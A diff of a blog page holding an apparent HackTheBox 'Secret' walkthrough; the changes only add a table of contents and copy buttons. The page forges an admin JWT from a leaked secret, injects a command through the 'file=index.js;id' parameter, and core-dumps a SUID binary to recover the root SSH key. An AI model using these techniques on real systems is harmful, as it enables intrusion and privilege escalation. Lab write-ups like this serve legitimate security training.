@@ -118,17 +118,35 @@
     <div class="search-dropdown mobile">
         <div id="search-dropdown-mobile"></div>
     </div><main class="main">
-                <div class="container"><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Secret Hackthebox writeup</h1><div class="post-meta">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Secret Hackthebox writeup</h1><div class="post-meta">
             <div class="post-meta-line">&nbsp;<span class="post-category">in <a href="/categories/linux-machines/">Linux Machines</a></span></div>
             <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-26">2022-03-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;859 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
-        </div><div class="content" id="content"><p>In this Box we are going to follow documentation instructions to create a new user , will face sensitive data exposure will let us see a delete commit ,this will help us change our token to the admin token and login as admin , reading source codes we find a command injection so we will have a reverse shell as a user, for the root part there is a suid binary that can read any file on the system and count it , and in the source code it has <code>PR_SET_DUMPABLE</code> so we can dump it if it receives a signal while running ,we will send segmentation fault signal and dump the process then performing strings on the dump we can read the root ssh private key and login as root</p>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#analyzing-the-code">Analyzing the code</a></li>
+      </ul>
+    </li>
+    <li><a href="#root-access">Root Access</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>In this Box we are going to follow documentation instructions to create a new user , will face sensitive data exposure will let us see a delete commit ,this will help us change our token to the admin token and login as admin , reading source codes we find a command injection so we will have a reverse shell as a user, for the root part there is a suid binary that can read any file on the system and count it , and in the source code it has <code>PR_SET_DUMPABLE</code> so we can dump it if it receives a signal while running ,we will send segmentation fault signal and dump the process then performing strings on the dump we can read the root ssh private key and login as root</p>
 <h1 id="scanning-">Scanning :</h1>
 <div class="code-block code-line-numbers" style="counter-reset: code-block 0">
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -A -T4 10.10.11.120 -oN nmap.txt
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
@@ -158,7 +176,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST http://10.10.11.120/api/user/register -H <span class="s1">&#39;Content-Type: application/json&#39;</span> -d <span class="s1">&#39;{&#34;name&#34;: &#34;MESBAHA&#34;,&#34;email&#34;: &#34;test@testers.com&#34;,&#34;password&#34;: &#34;hecker&#34;}&#39;</span></span></span></code></pre></div></div>
 <p><img
         class="lazyload"
@@ -182,7 +200,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST http://10.10.11.120/api/user/login -H <span class="s1">&#39;Content-Type: application/json&#39;</span> -d <span class="s1">&#39;{&#34;email&#34;: &#34;test@testers.com&#34;,&#34;password&#34;: &#34;hecker&#34;}&#39;</span></span></span></code></pre></div></div>
 <p><img
         class="lazyload"
@@ -215,7 +233,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -H <span class="s2">&#34;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNlZGEzZTQ0NWI1YzA0NWM2MzRlMTgiLCJuYW1lIjoiTUVTQkFIQSIsImVtYWlsIjoidGVzdEB0ZXN0ZXJzLmNvbSIsImlhdCI6MTY0ODI4NjQ1MH0.qw4zy4hLWs95jH4y09sEcgOFPxDtOEWaw9Xv_E5ZpOg&#34;</span> http://10.10.11.120/api/priv</span></span></code></pre></div></div>
 <p><img
         class="lazyload"
@@ -240,7 +258,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget http://10.10.11.120/download/files.zip
 </span></span><span class="line"><span class="cl">unzip files.zip</span></span></code></pre></div></div>
 <p><img
@@ -256,7 +274,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git log</span></span></code></pre></div></div>
 <p><img
         class="lazyload"
@@ -271,7 +289,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">DB_CONNECT</span> <span class="o">=</span> <span class="s1">&#39;mongodb://127.0.0.1:27017/auth-web&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">TOKEN_SECRET</span> <span class="o">=</span> secret</span></span></code></pre></div></div>
 <p>it contains the environment variables , there are very common mistakes can happen at this file like providing username and password at the connect variable or releasing secret tokens.</p>
@@ -280,7 +298,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78</span></span></code></pre></div></div>
 <p><img
         class="lazyload"
@@ -314,7 +332,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -H <span class="s2">&#34;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNlZGEzZTQ0NWI1YzA0NWM2MzRlMTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdGVycy5jb20iLCJpYXQiOjE2NDgyODY0NTB9.V0Sp_hlU1cYAZ_tYZ3_vHJuQ2saLfoiaxPrzZssD2-E&#34;</span> http://10.10.11.120/api/priv</span></span></code></pre></div></div>
 <p><img
         class="lazyload"
@@ -347,7 +365,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git log --oneline <span class="si">${</span><span class="nv">file</span><span class="si">}</span></span></span></code></pre></div></div>
 <p>we can try see if it works :</p>
 <p><img
@@ -363,7 +381,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -H <span class="s2">&#34;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNlZGEzZTQ0NWI1YzA0NWM2MzRlMTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdGVycy5jb20iLCJpYXQiOjE2NDgyODY0NTB9.V0Sp_hlU1cYAZ_tYZ3_vHJuQ2saLfoiaxPrzZssD2-E&#34;</span> <span class="s2">&#34;http://10.10.11.120/api/logs?file=index.js;id&#34;</span></span></span></code></pre></div></div>
 <p><img
         class="lazyload"
@@ -400,7 +418,7 @@
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">17824</span> Oct  <span class="m">7</span> 10:03 count</span></span></code></pre></div></div>
 <p>if we try to run the program we can see it just counts the content in a file</p>
 <p><img
@@ -435,7 +453,7 @@
     <div class="code-header language-C">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="nf">prctl</span><span class="p">(</span><span class="n">PR_SET_DUMPABLE</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span></span></span></code></pre></div></div>
 <p>checking <strong>prctl()</strong> manual <a href="https://man7.org/linux/man-pages/man2/prctl.2.html" target="_blank" rel="noopener noreffer ">here</a> we can find :</p>
 <p><img
@@ -492,7 +510,7 @@ in shell-2 : kill the process <code>ex: kill -SIGSEGV 1718 </code></p>
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apport-unpack  _opt_count.1000.crash /tmp/dumps</span></span></code></pre></div></div>
 <p>now perform <code>strings</code> on <code>CoreDump</code></p>
 <p><img
@@ -509,7 +527,7 @@ in shell-2 : kill the process <code>ex: kill -SIGSEGV 1718 </code></p>
     <div class="code-header language-bash">
         <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
         <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
     </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod <span class="m">600</span> id_rsa
 </span></span><span class="line"><span class="cl">ssh root@10.10.11.120 -i id_rsa</span></span></code></pre></div></div>
 <p><img
@@ -554,5 +572,5 @@ in shell-2 : kill the process <code>ex: kill -SIGSEGV 1718 </code></p>
         <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                 <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
             </a>
-        </div><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":5,"noResultsFound":"No results found","snippetLength":10,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
+        </div><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":5,"noResultsFound":"No results found","snippetLength":10,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
 </html>
